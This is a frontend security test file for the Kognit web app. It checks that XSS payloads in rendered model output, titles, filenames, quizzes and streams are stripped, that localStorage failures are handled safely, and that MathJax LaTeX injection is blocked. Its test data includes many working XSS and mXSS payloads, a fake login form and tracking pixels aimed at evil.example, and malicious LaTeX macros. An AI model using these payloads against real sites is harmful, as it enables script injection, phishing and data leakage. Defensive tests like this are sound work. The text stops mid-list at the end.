/* ============================================================
   KOGNIT P1 HARDENING — P1-3 (XSS) and P1-4 (localStorage)
   ============================================================
   Runs the REAL static/js/app.js, REAL static/js/stream-render.js
   and the REAL vendored DOMPurify (static/js/vendor/purify.min.js)
   in jsdom, with the real `marked` package. Only Supabase and
   fetch are stubbed (they need a live backend).

   Part C additionally runs the REAL production MathJax 3.2.2
   bundle (tex-svg.js from the `mathjax` npm package) with the
   MathJax config extracted from the REAL templates/index.html,
   so the macro hardening is tested against the shipped config,
   not a copy of it.

   Run: node tests_frontend/test_security_hardening.mjs
   ============================================================ */

import { JSDOM } from "jsdom";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, "..");

let passed = 0, failed = 0;
const failures = [];
async function check(name, fn) {
    try { await fn(); passed++; console.log(`  PASS  ${name}`); }
    catch (e) { failed++; failures.push({ name, e }); console.log(`  FAIL  ${name}\n        ${e.message}`); }
}
function assert(c, m) { if (!c) throw new Error(m || "assertion failed"); }
function eq(a, b, m) { if (a !== b) throw new Error(`${m || "mismatch"}: expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// `exports` maps in these packages block deep require.resolve() paths, so locate them on disk.
const NODE_MODULES = path.join(HERE, "node_modules");
const MARKED_SRC = fs.readFileSync(path.join(NODE_MODULES, "marked", "lib", "marked.umd.js"), "utf8");
const PURIFY_SRC = fs.readFileSync(path.join(ROOT, "static/js/vendor/purify.min.js"), "utf8");
const STREAM_SRC = fs.readFileSync(path.join(ROOT, "static/js/stream-render.js"), "utf8");
const APP_SRC = fs.readFileSync(path.join(ROOT, "static/js/app.js"), "utf8");
const TEMPLATE = fs.readFileSync(path.join(ROOT, "templates/index.html"), "utf8");

/* ------------------------------------------------------------
   Boot the real app in jsdom.
   opts.session      -> Supabase session (null = guest)
   opts.upsertResult -> what supabase .upsert() resolves/throws
   opts.noPurify     -> simulate DOMPurify failing to load
   opts.beforeApp    -> hook(window) run before app.js executes
   ------------------------------------------------------------ */
async function boot(opts = {}) {
    let html = TEMPLATE.replace(/<script[^>]*src="[^"]*"[^>]*><\/script>/g, "");
    const dom = new JSDOM(html, { runScripts: "dangerously", pretendToBeVisual: true, url: "https://kognit.test/" });
    const w = dom.window;
    w.matchMedia = () => ({ matches: false, addEventListener() {}, removeEventListener() {} });
    w.TextEncoder = TextEncoder;   // jsdom's window lacks these; app.js's stream reader needs TextDecoder
    w.TextDecoder = TextDecoder;

    const log = { upserts: [], alerts: [], signOuts: 0, errors: [] };
    w.alert = (m) => { log.alerts.push(String(m)); };
    w.confirm = () => true;
    const origErr = w.console.error;
    w.console.error = (...a) => { log.errors.push(a.map(String).join(" ")); };

    const query = {
        select: () => query,
        order: async () => ({ data: [], error: null }),
        upsert: async (payload) => {
            log.upserts.push(payload);
            if (opts.upsertResult === "throw") throw new Error("network down");
            if (opts.upsertResult === "error") return { error: { message: "rls denied" } };
            return { error: null };
        },
        delete: () => query,
        eq: async () => ({ error: null }),
    };
    const session = opts.session === undefined ? null : opts.session;
    w.supabase = {
        createClient: () => ({
            auth: {
                getSession: async () => ({ data: { session } }),
                onAuthStateChange: () => ({ data: { subscription: { unsubscribe() {} } } }),
                signOut: async () => { log.signOuts++; return {}; },
            },
            from: () => query,
        }),
    };

    w.eval(MARKED_SRC);
    if (opts.beforeApp) opts.beforeApp(w);
    const add = (src) => { const s = w.document.createElement("script"); s.textContent = src; w.document.body.appendChild(s); };
    add(STREAM_SRC);
    if (!opts.noPurify) add(PURIFY_SRC);
    add(APP_SRC);
    w.document.dispatchEvent(new w.Event("DOMContentLoaded"));
    await sleep(60);
    return { w, dom, log, origErr };
}

const render = (w, md) => w.createBotMessageElement(md).querySelector(".bot-message-content");

/* =============================================================
   PART A — P1-3: XSS in the model-output rendering pipeline
   ============================================================= */
console.log("\nP1-3  XSS hardening (real app.js + marked + DOMPurify)");
{
    const { w } = await boot();

    const noExec = (el, label) => {
        assert(!el.querySelector("script"), `${label}: <script> survived`);
        for (const node of el.querySelectorAll("*")) {
            for (const a of node.attributes) {
                assert(!/^on/i.test(a.name), `${label}: event-handler attr ${a.name} on <${node.localName}> survived`);
                assert(a.name !== "style", `${label}: inline style survived on <${node.localName}>`);
                if (/^(href|src|action|formaction|xlink:href)$/i.test(a.name)) {
                    assert(!/^\s*(javascript|data|vbscript):/i.test(a.value.replace(/[\u0000-\u0020]/g, "")), `${label}: dangerous URL in ${a.name}: ${a.value}`);
                }
            }
        }
        for (const tag of ["iframe", "object", "embed", "form", "style", "link", "meta", "base", "svg", "math", "img", "video", "audio", "textarea", "select", "button", "frame", "frameset"]) {
            assert(!el.querySelector(tag), `${label}: <${tag}> survived`);
        }
    };

    await check("<script> tag is removed", () => {
        const el = render(w, "hello <script>window.__pwned=1</script> world");
        noExec(el, "script");
        assert(el.textContent.includes("hello") && el.textContent.includes("world"), "surrounding text must remain");
    });

    await check("event-handler attributes are removed (img/svg/body/a/div/details)", () => {
        const payloads = [
            `<img src=x onerror="window.__pwned=1">`,
            `<svg onload="window.__pwned=1"></svg>`,
            `<a href="https://example.com" onclick="window.__pwned=1">x</a>`,
            `<div onmouseover="window.__pwned=1">x</div>`,
            `<details open ontoggle="window.__pwned=1"><summary>x</summary></details>`,
            `<body onload="window.__pwned=1">`,
            `<p onclick=alert(1)>x</p>`,
        ];
        for (const p of payloads) noExec(render(w, p), p);
    });

    await check("javascript:/data:/vbscript: URLs are neutralized (HTML and Markdown link syntax, obfuscated)", () => {
        const payloads = [
            `<a href="javascript:alert(1)">x</a>`,
            `[click](javascript:alert(1))`,
            `<a href="JaVaScRiPt:alert(1)">x</a>`,
            `<a href="java&#x09;script:alert(1)">x</a>`,
            `<a href="&#106;avascript:alert(1)">x</a>`,
            `<a href="  javascript:alert(1)">x</a>`,
            `<a href="data:text/html,<script>alert(1)</script>">x</a>`,
            `<a href="vbscript:msgbox(1)">x</a>`,
            `[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)`,
        ];
        for (const p of payloads) {
            const el = render(w, p);
            noExec(el, p);
            for (const a of el.querySelectorAll("a")) {
                assert(!a.getAttribute("href") || /^(https?:|mailto:|#)/i.test(a.getAttribute("href")), `unsafe href kept: ${a.getAttribute("href")}`);
            }
        }
    });

    await check("iframe / object / embed / form / input / style / link / meta / svg / math / img are all stripped", () => {
        const payloads = [
            `<iframe src="https://evil.example"></iframe>`,
            `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
            `<object data="https://evil.example/x.swf"></object>`,
            `<embed src="https://evil.example/x">`,
            `<form action="https://evil.example"><input name=password type=password><button>Log in</button></form>`,
            `<input type="text" value="x">`,
            `<style>body{display:none}</style>`,
            `<link rel="stylesheet" href="https://evil.example/x.css">`,
            `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
            `<base href="https://evil.example/">`,
            `<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
            `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
            `<img src="https://evil.example/pixel.gif?leak=chat">`,
            `![tracking](https://evil.example/pixel.gif?leak=chat)`,
            `<textarea></textarea><select><option>x</option></select>`,
        ];
        for (const p of payloads) noExec(render(w, p), p);
    });

    await check("inline style attributes are removed (CSS overlay / UI-redress)", () => {
        const el = render(w, `<div style="position:fixed;inset:0;background:red;z-index:99999">FAKE LOGIN</div><span style="color:red">x</span>`);
        noExec(el, "style attr");
        assert(el.textContent.includes("FAKE LOGIN"), "text content is kept, only the styling is dropped");
    });

    await check("arbitrary class names are dropped (cannot reuse .modal-overlay / .hidden), app classes kept", () => {
        const el = render(w, `<div class="modal-overlay hidden">x</div><span class="kognit-bengali-formula">y</span>`);
        assert(!el.querySelector(".modal-overlay"), "modal-overlay class must be stripped");
        assert(!el.querySelector(".hidden"), "hidden class must be stripped");
        assert(el.querySelector("span.kognit-bengali-formula"), "the app's own Bengali-formula class must be preserved");
    });

    await check("mXSS / nesting tricks do not produce executable output", () => {
        const payloads = [
            `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
            `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`,
            `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`,
            `<table><caption><svg><desc><style><img src=x onerror=alert(1)></style>`,
            `<a href="https://example.com"><svg><style><img src=x onerror=alert(1)>`,
        ];
        for (const p of payloads) noExec(render(w, p), p);
    });

    await check("NORMAL Markdown still renders: headings, bold, italic, lists, code, tables, links, quotes, hr, task list", () => {
        const md = [
            "# Title", "## Sub", "", "Some **bold**, *italic*, ~~gone~~ and `inline code`.", "",
            "- one", "- two", "", "1. first", "2. second", "",
            "```python", "print('hi')", "```", "",
            "| a | b |", "|---|:-:|", "| 1 | 2 |", "",
            "[Kognit](https://example.com/page) and <https://example.org>", "",
            "> quoted", "", "---", "", "- [x] done", "- [ ] todo",
        ].join("\n");
        const el = render(w, md);
        for (const sel of ["h1", "h2", "strong", "em", "del", "p code", "ul li", "ol li", "pre code.language-python", "table th", "table td", "a[href='https://example.com/page']", "blockquote", "hr"]) {
            assert(el.querySelector(sel), `expected ${sel} in rendered output`);
        }
        const boxes = el.querySelectorAll("input[type=checkbox]");
        eq(boxes.length, 2, "both task-list checkboxes kept");
        assert([...boxes].every((b) => b.disabled), "checkboxes must be inert/disabled");
        assert(el.querySelector("a[href='https://example.org']"), "autolink kept");
    });

    await check("regression: non-URL attributes keep their values (table align/colspan/rowspan, ol start, checkbox type)", () => {
        const el = render(w, "| a | b |\n|:-:|--:|\n| 1 | 2 |\n\n3. three\n4. four\n\n<table><tr><td colspan=\"2\" rowspan=\"3\">x</td></tr></table>");
        assert(el.querySelector("th[align='center']"), "table alignment must survive");
        assert(el.querySelector("th[align='right']"), "table right alignment must survive");
        assert(el.querySelector("ol[start='3']"), "ordered-list start must survive");
        assert(el.querySelector("td[colspan='2'][rowspan='3']"), "colspan/rowspan must survive");
    });

    await check("link policy: only http(s)/mailto/# hrefs survive on <a> (relative, ftp, tel, javascript are dropped)", () => {
        const keep = ["https://example.com/a?b=c", "http://example.com", "mailto:a@b.co", "#section"];
        const drop = ["/api/chat", "ftp://example.com/x", "tel:+8801", "//evil.example/x", "javascript:alert(1)", "data:text/html,x", "relative/path"];
        for (const h of keep) assert(w.sanitizeRenderedHtml(`<a href="${h}">x</a>`).includes(`href="${h}"`), `should keep ${h}`);
        for (const h of drop) assert(!/href=/.test(w.sanitizeRenderedHtml(`<a href="${h}">x</a>`)), `should drop ${h}`);
    });

    await check("welcome-message HTML (<b>, <i>, emoji) still renders", () => {
        const el = render(w, "👋 <b>Welcome to Kognit!</b> Your board is active. <i>Ask</i> anything.");
        assert(el.querySelector("b") && el.querySelector("i"), "benign inline HTML must survive");
    });

    await check("HTML sub/sup (chemistry/maths formatting) survive", () => {
        const el = render(w, "H<sub>2</sub>O and x<sup>2</sup>");
        assert(el.querySelector("sub") && el.querySelector("sup"), "sub/sup preserved");
    });

    // ---- MathJax flow: MathJax typesets the DOM TEXT, so the sanitizer must leave every
    //      math-bearing text node byte-identical to the pre-fix pipeline. ----
    const MATH_CORPUS = [
        "Inline $x^2 + y^2 = z^2$ here.",
        "Display:\n\n$$\\int_0^1 x^2\\,dx = \\frac{1}{3}$$\n\nafter.",
        "Escaped \\(a < b\\) and \\[c > d\\] forms.",
        "Underscores $\\text{C}_6\\text{H}_{12}\\text{O}_6$ survive marked.",
        "Chem $\\ce{H2O + CO2 -> H2CO3}$ ok.",
        "Aligned $$\\begin{aligned}a&=b\\\\c&=d\\end{aligned}$$",
        "Inequality $a < b \\land c > d$ and $a \\& b$ and $\"q\" 'r'$.",
        "বাংলা $v = \\frac{s}{t}$ সূত্র এবং $$F = ma$$ ব্যাখ্যা।",
        "Mixed **bold** with $E = mc^2$ and `code $not math$` and a [link](https://example.com).",
        "- item $x_1$\n- item $x_2$\n\n| h | v |\n|---|---|\n| $a_1$ | $b_2$ |",
    ];
    await check("MathJax flow: sanitized output text == unsanitized pipeline text for the whole math corpus", () => {
        for (const md of MATH_CORPUS) {
            const before = w.document.createElement("div");
            const { text, segments } = w.protectMathSegments(md);
            before.innerHTML = w.restoreProtectedMathSegments(w.marked.parse(text), segments); // OLD pipeline
            const after = render(w, md);                                                     // NEW pipeline
            eq(after.textContent, before.textContent, `text seen by MathJax changed for: ${md}`);
        }
    });

    await check("MathJax flow: $ / $$ delimiters and backslash commands are intact, typesettable text", () => {
        // NOTE: \(..\) and \[..\] are NOT in this list on purpose. marked.js itself
        // turns them into plain "(..)"/"[..]" (Markdown backslash-escapes) BEFORE any
        // sanitizer code runs, and the app only protects $ / $$ (the system prompt tells
        // the model to use those). That is pre-existing behaviour, unchanged by P1-3 -
        // the corpus-equality test above proves old and new pipelines agree on it.
        const el = render(w, "Inline $x^2$, block $$\\frac{a}{b}$$, chem $\\ce{H2O}$, sub $a_1 + b_2$.");
        const t = el.textContent;
        for (const frag of ["$x^2$", "$$\\frac{a}{b}$$", "$\\ce{H2O}$", "$a_1 + b_2$"]) assert(t.includes(frag), `missing ${frag}`);
    });

    await check("mixed Markdown + malicious HTML + math: attack removed, math and formatting intact", () => {
        const el = render(w,
            "**Answer:** $F = ma$ <img src=x onerror=\"window.__pwned=1\"> and [x](javascript:alert(1)) " +
            "<script>alert(1)</script>\n\n$$E = mc^2$$\n\n- step $x_1$");
        noExec(el, "mixed");
        assert(el.querySelector("strong"), "bold kept");
        assert(el.textContent.includes("$F = ma$") && el.textContent.includes("$$E = mc^2$$") && el.textContent.includes("$x_1$"), "math text kept");
        assert(el.querySelector("li"), "list kept");
    });

    await check("Bengali math segments (app-generated spans) survive with their class", () => {
        const el = render(w, "বেগ $v = ১০ m/s$ এবং $$F = ma$$");
        assert(el.textContent.includes("বেগ"), "Bengali text kept");
    });

    await check("sanitizer is null/undefined/empty safe", () => {
        eq(w.sanitizeRenderedHtml(null), "");
        eq(w.sanitizeRenderedHtml(undefined), "");
        eq(w.sanitizeRenderedHtml(""), "");
        eq(w.sanitizeRenderedHtml(42, "inline"), "42");
    });

    await check("inline profile (quiz text): keeps <sub>/<sup>/<b>, strips links, scripts, handlers, images", () => {
        const out = w.sanitizeRenderedHtml(`H<sub>2</sub>O <b>x</b> <a href="https://e.com">l</a> <script>1</script><img src=x onerror=1> <span style="x:y" class="z">s</span>`, "inline");
        assert(out.includes("<sub>2</sub>") && out.includes("<b>x</b>"), `benign formatting lost: ${out}`);
        assert(!/<a\b|<script|<img|onerror|style=|class=/i.test(out), `unsafe content survived: ${out}`);
    });

    await check("project title and uploaded filename helpers escape HTML", () => {
        eq(w.escapeUserText(`<img src=x onerror=alert(1)>`), "&lt;img src=x onerror=alert(1)&gt;");
        eq(w.escapeUserText(`a"b'c&d`), "a&quot;b&#39;c&amp;d");
        eq(w.escapeUserText(null), "");
        eq(w.escapeUserText(undefined), "");
        eq(w.escapeUserText(123), "123");
    });
}

await check("malicious PROJECT TITLE is inert in the sidebar (real renderHistoryList)", async () => {
    const { w } = await boot();
    const title = `<img src=x onerror="window.__pwned=1"><script>window.__pwned=2</script>`;
    w.eval(`projects = [{ id: "p_evil", title: ${JSON.stringify(title)}, chats: [{ id: "c1", title: "Chat", messages: [] }] }]; activeProjectId = "p_evil"; activeChatId = "c1";`);
    w.renderHistoryList();
    const list = w.document.getElementById("history-list");
    assert(!list.querySelector("img"), "title HTML must not become an <img>");
    assert(!list.querySelector("script"), "title HTML must not become a <script>");
    assert(list.textContent.includes("<img src=x"), "the title must be shown as literal text");
    assert(!w.__pwned, "payload must not have executed");
});

await check("malicious UPLOADED FILENAME is inert in the PDF-success message (real handlePDFUpload)", async () => {
    const { w } = await boot({ session: { access_token: "tok", user: { id: "u1", email: "a@b.c" } } });
    w.fetch = async () => ({ ok: true, status: 200, json: async () => ({ status: "success" }) });
    const evil = `x"><img src=x onerror="window.__pwned=1">.pdf`;
    const file = new w.File(["%PDF-1.4"], evil, { type: "application/pdf" });
    await w.handlePDFUpload({ target: { files: [file], value: "" } });
    const chatBox = w.document.getElementById("chat-box");
    assert(!chatBox.querySelector("img[onerror]"), "filename must not inject an element");
    assert(!w.__pwned, "payload must not have executed");
    assert(chatBox.textContent.includes("PDF Loaded Successfully"), "success message still shown");
});

await check("QUIZ screens: AI-generated question/options/explanation cannot inject script or handlers", async () => {
    const { w } = await boot({ session: { access_token: "tok", user: { id: "u1", email: "a@b.c" } } });
    const evil = `Q <img src=x onerror="window.__pwned=1"> <script>window.__pwned=2</script> H<sub>2</sub>O`;
    w.eval(`quizQuestions = [{ question: ${JSON.stringify(evil)}, options: [${JSON.stringify(evil)}, "B", "C", "D"], correct_index: 0, explanation: ${JSON.stringify(evil)} }]; currentQuizIdx = 0; userQuizAnswers = [0];`);
    w.renderQuizQuestion();
    const qc = w.document.getElementById("quiz-question-container");
    assert(!qc.querySelector("img") && !qc.querySelector("script"), "question screen must be inert");
    assert(qc.querySelector("sub"), "benign <sub> formatting preserved");
    assert(qc.querySelectorAll(".quiz-opt-btn").length === 4, "all four options still render");
    // results screen
    w.fetch = async () => ({ ok: true, status: 200, json: async () => ({}) });
    w.showQuizResults();
    const rl = w.document.getElementById("result-details-list");
    assert(!rl.querySelector("img") && !rl.querySelector("script"), "results screen must be inert");
    assert(!w.__pwned, "payload must not have executed");
});

await check("STREAMING paint path is sanitized (real sendMessage + mock NDJSON stream)", async () => {
    const { w } = await boot({ session: { access_token: "tok", user: { id: "u1", email: "a@b.c" } } });
    const enc = new w.TextEncoder();
    let release;
    const gate = new Promise((r) => { release = r; });
    let step = 0;
    w.fetch = async () => ({
        ok: true, status: 200, headers: { get: () => null },
        body: { getReader: () => ({ read: async () => {
            step++;
            if (step === 1) return { done: false, value: enc.encode(JSON.stringify({ type: "start" }) + "\n") };
            if (step === 2) return { done: false, value: enc.encode(JSON.stringify({ type: "delta", text: "Streaming <img src=x onerror=\"window.__pwned=1\"> and [x](javascript:alert(1))\n\nmore text.\n\n" }) + "\n") };
            await gate; // hold the stream open so the in-flight paint can be inspected
            if (step === 3) return { done: false, value: enc.encode(JSON.stringify({ type: "done", reply: "Final <script>window.__pwned=3</script> answer $x^2$" }) + "\n") };
            return { done: true };
        } }) },
        json: async () => ({ reply: "x" }),
    });
    w.document.getElementById("user-input").value = "question";
    const sending = w.sendMessage();
    await sleep(150);
    const inflight = w.document.getElementById("chat-box").innerHTML;
    assert(!/<img[^>]*onerror/i.test(inflight), "in-flight streamed paint must not contain an executable <img>");
    assert(!/href="javascript:/i.test(inflight), "in-flight streamed paint must not contain a javascript: link");
    assert(inflight.includes("Streaming"), "streamed text must still be painted");
    release();
    await sending;
    await sleep(50);
    const finalHtml = w.document.getElementById("chat-box").innerHTML;
    assert(!/<script/i.test(finalHtml), "final answer must not contain <script>");
    assert(finalHtml.includes("$x^2$"), "final answer math text intact");
    assert(!w.__pwned, "no payload may have executed at any point");
});

await check("FAIL CLOSED: if DOMPurify did not load, model output is shown as escaped text, never raw", async () => {
    const { w, log } = await boot({ noPurify: true });
    const el = render(w, `x <img src=x onerror="window.__pwned=1"> <script>window.__pwned=2</script>`);
    assert(!el.querySelector("img") && !el.querySelector("script"), "no element may be created");
    assert(el.textContent.includes("<img") || el.textContent.includes("&lt;img") || el.innerHTML.includes("&lt;img"), "tags are displayed as text");
    assert(!w.__pwned, "must not execute");
    assert(log.errors.some((e) => /sanitizer unavailable/i.test(e)), "the failure must be logged");
});

await check("static guard: no marked.parse() result reaches innerHTML except through sanitizeRenderedHtml()", () => {
    const lines = APP_SRC.split("\n");
    const sinks = lines.map((l, i) => ({ l, n: i + 1 })).filter(({ l }) => /innerHTML\s*=/.test(l) && !/^\s*\/\//.test(l));
    const parsedVars = new Set();
    lines.forEach((l) => { const m = l.match(/(?:let|const)\s+(\w+)\s*=\s*restoreProtectedMathSegments/); if (m) parsedVars.add(m[1]); });
    for (const { l, n } of sinks) {
        const raw = /marked\.parse|restoreProtectedMathSegments/.test(l) || [...parsedVars].some((v) => new RegExp(`=\\s*${v}\\s*;`).test(l));
        if (raw) assert(/sanitizeRenderedHtml\(/.test(l), `app.js:${n} assigns parsed Markdown to innerHTML without sanitizeRenderedHtml(): ${l.trim()}`);
    }
    const parseCalls = lines.filter((l) => /marked\.parse\(/.test(l) && !/^\s*\/\//.test(l)).length;
    eq(parseCalls, 2, "unexpected number of marked.parse() call sites - a new one must be reviewed for sanitization");
});

/* =============================================================
   PART B — P1-4: localStorage is a best-effort cache
   ============================================================= */
console.log("\nP1-4  localStorage / data-loss hardening (real app.js)");

const USER = { access_token: "tok", user: { id: "u1", email: "a@b.c" } };
const quotaError = (w) => new w.DOMException("The quota has been exceeded.", "QuotaExceededError");
const breakSetItem = (w, mode = "quota") => {
    w.Storage.prototype.setItem = function () {
        throw mode === "security" ? new w.DOMException("denied", "SecurityError") : quotaError(w);
    };
};

await check("success path: cached locally AND upserted remotely, no popup", async () => {
    const { w, log } = await boot({ session: USER });
    log.upserts.length = 0;
    await w.saveProjectsToStorage();
    eq(log.upserts.length, 1, "remote upsert");
    const cached = JSON.parse(w.localStorage.getItem("kognit_projects"));
    assert(Array.isArray(cached) && cached.length >= 1, "local cache written");
    eq(log.alerts.length, 0, "no popup on success");
});

await check("QuotaExceededError on setItem does NOT prevent the Supabase upsert (the original bug)", async () => {
    const { w, log } = await boot({ session: USER });
    log.upserts.length = 0;
    breakSetItem(w, "quota");
    await w.saveProjectsToStorage();
    eq(log.upserts.length, 1, "remote persistence must still run");
    eq(log.alerts.length, 0, "no noisy popup when remote persistence succeeded");
});

await check("SecurityError on setItem does NOT prevent the Supabase upsert", async () => {
    const { w, log } = await boot({ session: USER });
    log.upserts.length = 0;
    breakSetItem(w, "security");
    await w.saveProjectsToStorage();
    eq(log.upserts.length, 1);
    eq(log.alerts.length, 0);
});

await check("storage entirely unavailable (accessing window.localStorage throws): save still reaches Supabase and nothing throws", async () => {
    const { w, log } = await boot({ session: USER });
    log.upserts.length = 0;
    Object.defineProperty(w, "localStorage", { configurable: true, get() { throw new w.DOMException("denied", "SecurityError"); } });
    await w.saveProjectsToStorage();
    eq(log.upserts.length, 1);
    eq(log.alerts.length, 0);
});

await check("app BOOTS for a guest even when localStorage access throws (startup path)", async () => {
    const { w, log } = await boot({
        session: null,
        beforeApp: (win) => Object.defineProperty(win, "localStorage", { configurable: true, get() { throw new win.DOMException("denied", "SecurityError"); } }),
    });
    assert(typeof w.createNewProject === "function", "app.js loaded");
    const snapshot = w.getProjectsSnapshot();
    assert(Array.isArray(snapshot) && snapshot.length >= 1, "guest still gets a usable first project");
    assert(!log.errors.some((e) => /Uncaught|SecurityError/.test(e)), "no uncaught storage error");
});

await check("corrupt cache JSON does not break guest startup", async () => {
    const { w } = await boot({
        session: null,
        beforeApp: (win) => win.localStorage.setItem("kognit_projects", "{not valid json"),
    });
    assert(w.getProjectsSnapshot().length >= 1, "falls back to a fresh project");
});

await check("quota failure: retries the cache WITHOUT base64 image previews, keeping conversation text", async () => {
    const { w, log } = await boot({ session: USER });
    w.eval(`projects = [{ id: "p1", title: "T", chats: [{ id: "c1", title: "C", messages: [
        { role: "user", text: "look at this", image: "data:image/png;base64,${"A".repeat(5000)}" },
        { role: "bot", text: "I see it" } ] }] }]; activeProjectId = "p1"; activeChatId = "c1";`);
    const realSet = w.Storage.prototype.setItem;
    w.Storage.prototype.setItem = function (k, v) { if (String(v).length > 2000) throw quotaError(w); return realSet.call(this, k, v); };
    log.upserts.length = 0;
    await w.saveProjectsToStorage();
    const cached = JSON.parse(w.localStorage.getItem("kognit_projects"));
    eq(cached[0].chats[0].messages[0].text, "look at this", "text cached");
    eq(cached[0].chats[0].messages[1].text, "I see it", "bot text cached");
    assert(!("image" in cached[0].chats[0].messages[0]), "base64 preview omitted from the local cache only");
    eq(log.upserts.length, 1, "remote upsert still sent");
    assert(log.upserts[0].chats[0].messages[0].image.startsWith("data:image/png"), "remote copy keeps the image preview (unchanged behaviour)");
});

await check("remote upsert throwing (network) is handled: no unhandled rejection, no popup if the local cache worked", async () => {
    const { w, log } = await boot({ session: USER, upsertResult: "throw" });
    await w.saveProjectsToStorage();
    eq(log.alerts.length, 0, "local cache succeeded, so no popup");
});

await check("BOTH local and remote fail: one clear popup, not one per save", async () => {
    const { w, log } = await boot({ session: USER, upsertResult: "error" });
    breakSetItem(w, "quota");
    await w.saveProjectsToStorage();
    await w.saveProjectsToStorage();
    await w.saveProjectsToStorage();
    eq(log.alerts.length, 1, "exactly one popup for a failure streak");
    assert(/could not be saved/i.test(log.alerts[0]), "message is understandable");
});

await check("popup re-arms after a successful save", async () => {
    const { w, log } = await boot({ session: USER, upsertResult: "error" });
    const realSet = w.Storage.prototype.setItem;
    breakSetItem(w, "quota");
    await w.saveProjectsToStorage();
    eq(log.alerts.length, 1);
    w.Storage.prototype.setItem = realSet;
    await w.saveProjectsToStorage(); // local cache works again -> success resets the streak
    breakSetItem(w, "quota");
    await w.saveProjectsToStorage();
    eq(log.alerts.length, 2, "a later, separate failure streak is reported again");
});

await check("guest + local storage failure: user is told once (localStorage is their only store)", async () => {
    const { w, log } = await boot({ session: null });
    breakSetItem(w, "quota");
    await w.saveProjectsToStorage();
    await w.saveProjectsToStorage();
    eq(log.upserts.length, 0, "guests never sync remotely");
    eq(log.alerts.length, 1);
});

await check("guest + local storage failure on the SLIM retry too: still no throw", async () => {
    const { w } = await boot({ session: null });
    breakSetItem(w, "security");
    await w.saveProjectsToStorage(); // must simply resolve
});

await check("logout completes its in-memory cleanup even when removeItem throws", async () => {
    const { w, log } = await boot({ session: USER });
    w.Storage.prototype.removeItem = function () { throw new w.DOMException("denied", "SecurityError"); };
    await w.handleLogout();
    eq(log.signOuts, 1, "signed out");
    eq(w.eval("currentProfile"), null, "later cleanup steps (profile reset) still ran");
});

await check("collapsed-folder preference save is non-fatal when storage throws", async () => {
    const { w } = await boot({ session: null });
    breakSetItem(w, "quota");
    w.saveCollapsedProjectIds(); // must not throw
});

await check("static guard: app.js touches localStorage only inside the three safe wrappers", () => {
    const hits = APP_SRC.split("\n").map((l, i) => ({ l, n: i + 1 })).filter(({ l }) => /localStorage\.(getItem|setItem|removeItem)/.test(l) && !/^\s*\/\//.test(l));
    eq(hits.length, 3, `unexpected direct localStorage access: ${hits.map((h) => h.n).join(",")}`);
});

/* =============================================================
   PART C — REAL MathJax 3.2.2 bundle + REAL template config
   ============================================================= */
console.log("\nP1-3  MathJax LaTeX injection (real MathJax bundle + real template config)");

async function bootMathJax() {
    const m = TEMPLATE.match(/<script>\s*(window\.MathJax = \{[\s\S]*?\n        \};)\s*<\/script>/);
    assert(m, "could not locate the MathJax config block in templates/index.html");
    const mjDir = path.join(NODE_MODULES, "mathjax", "es5");
    const dom = new JSDOM("<!doctype html><body></body>", { url: "https://kognit.test/", runScripts: "dangerously", resources: "usable", pretendToBeVisual: true });
    const w = dom.window;
    const origLog = w.console.log; const origErr = w.console.error;
    w.console.error = () => {}; w.console.log = () => {}; w.console.warn = () => {};
    w.eval(m[1]);                                              // the SHIPPED config, verbatim
    w.MathJax.loader = { paths: { mathjax: pathToFileURL(mjDir).href } }; // test-only: load autoload extensions from node_modules
    w.MathJax.startup = { typeset: false };                    // test-only: we call tex2svgPromise directly
    w.eval(fs.readFileSync(path.join(mjDir, "tex-svg.js"), "utf8"));
    await Promise.race([w.MathJax.startup.promise, sleep(15000).then(() => { throw new Error("MathJax startup timed out"); })]);
    return { w, restore: () => { w.console.log = origLog; w.console.error = origErr; } };
}

{
    const { w, restore } = await bootMathJax();
    const typeset = async (tex) => (await Promise.race([w.MathJax.tex2svgPromise(tex), sleep(10000).then(() => { throw new Error("typeset timeout: " + tex); })])).outerHTML;
    // MathJax puts its own `position: relative` on every container; anything else is injected.
    const injectedStyle = (h) => (h.match(/style="[^"]*"/g) || []).filter((s) => !/^style="position: relative;"$/.test(s) && !/(vertical-align|min-width|display: none)/.test(s));

    const ATTACKS = {
        "\\href javascript:": "\\href{javascript:alert(document.cookie)}{click me}",
        "\\require{html} then \\href": "\\require{html}\\href{javascript:alert(1)}{click me}",
        "\\style position:fixed": "\\style{position:fixed;inset:0;background:red}{FAKE LOGIN}",
        "\\require{html} then \\style": "\\require{html}\\style{position:fixed;inset:0}{x}",
        "\\class": "\\class{modal-overlay}{x}",
        "\\cssId": "\\cssId{app-root}{x}",
        "\\bbox arbitrary CSS": "\\bbox[position:fixed;top:0;left:0;width:100vw]{x}",
        "\\bbox background:url()": "\\bbox[background:url(https://evil.example/beacon)]{x}",
        "\\text{\\href} via textmacros": "\\require{textmacros}\\text{\\href{javascript:alert(1)}{x}}",
    };
    for (const [name, tex] of Object.entries(ATTACKS)) {
        await check(`attack blocked: ${name}`, async () => {
            const h = await typeset(tex);
            assert(!/<a\b/i.test(h) && !/href=/i.test(h), "MathJax must not emit a link");
            assert(!/class="(modal-overlay|evil)"/.test(h) && !/id="app-root"/.test(h), "no injected class/id");
            const bad = injectedStyle(h);
            assert(bad.length === 0, `injected inline style: ${bad.join(" ")}`);
            assert(!/url\(/.test(h), "no url() in output");
        });
    }

    const LEGIT = {
        "fraction/superscript": "x^2 + \\frac{a}{b}",
        "chemistry \\ce": "\\ce{H2O + CO2 -> H2CO3}",
        "text chemistry": "\\text{C}_6\\text{H}_{12}\\text{O}_6",
        "\\color": "\\color{red}{x}",
        "\\cancel": "\\cancel{x}",
        "\\boldsymbol": "\\boldsymbol{x}",
        "\\boxed": "\\boxed{x = 1}",
        "aligned": "\\begin{aligned}a&=b\\\\c&=d\\end{aligned}",
